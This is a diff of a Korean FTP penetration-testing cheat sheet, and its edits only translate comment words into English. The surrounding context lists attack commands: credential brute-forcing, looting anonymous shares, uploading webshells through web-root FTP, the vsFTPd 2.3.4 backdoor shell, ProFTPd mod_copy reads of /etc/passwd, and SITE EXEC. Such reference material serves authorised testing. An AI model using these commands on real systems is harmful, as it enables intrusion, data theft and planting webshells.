@@ -34,7 +34,7 @@ ftp> get filename
 ftp> mget *
 ftp> put localfile
 
-# 재귀 다운로드
+# 재귀 download
 wget -m ftp://anonymous:@TARGET/
 wget -m --no-passive ftp://anonymous:@TARGET/
 ```
@@ -58,7 +58,7 @@ nxc ftp TARGET -u users.txt -p passwords.txt
 ### 쓰기 가능한 FTP
 
 ```bash
-# 웹루트와 연결된 FTP에 웹쉘 업로드
+# 웹루트와 연결된 FTP에 webshell upload
 ftp> put webshell.php
 ftp> put cmd.aspx
 
@@ -72,7 +72,7 @@ ftp> put cmd.aspx
 ```bash
 # vsFTPd 2.3.4 Backdoor
 nmap --script=ftp-vsftpd-backdoor -p 21 TARGET
-# 포트 6200에 백도어 쉘 바인딩
+# 포트 6200에 백도어 shell binding
 
 # ProFTPd 1.3.3c - mod_copy
 SITE CPFR /etc/passwd
@@ -95,11 +95,11 @@ nmap -b user:pass@FTP_SERVER TARGET
 ## 유용한 FTP 명령어
 
 ```text
-binary    # 바이너리 모드 (파일 손상 방지)
+binary    # binary 모드 (파일 손상 방지)
 passive   # Passive 모드 (방화벽 문제 시)
 prompt    # 대화형 확인 토글
-mget *    # 모든 파일 다운로드
-mput *    # 모든 파일 업로드
+mget *    # 모든 파일 download
+mput *    # 모든 파일 upload
 ls -la    # 숨겨진 파일 포함 목록
 ```
 
@@ -133,16 +133,16 @@ curl -k --ssl-reqd -u user:pass ftp://TARGET/
 # 익명 재귀 미러
 lftp -e "set ftp:anon-pass ''; mirror --parallel=5 / /tmp/loot; bye" anonymous@TARGET
 
-# credential + 업로드
+# credential + upload
 lftp -u user,pass TARGET -e "mirror -R /local /remote; bye"
 
-# 사이트 명령(원격 쉘 명령 - ProFTPd 등 일부 서버)
+# 사이트 명령(원격 shell 명령 - ProFTPd 등 일부 서버)
 lftp -u user,pass TARGET -e "quote SITE EXEC id; bye"
 ```
 
 ---
 
-## curl 원라이너
+## curl one-liner
 
 ```bash
 # directory 리스팅
@@ -151,7 +151,7 @@ curl -s ftp://anonymous:@TARGET/
 # 파일 가져오기
 curl -u user:pass ftp://TARGET/file -o file
 
-# 업로드
+# upload
 curl -T webshell.php -u user:pass ftp://TARGET/
 
 # credential 유출 감시 (평문)
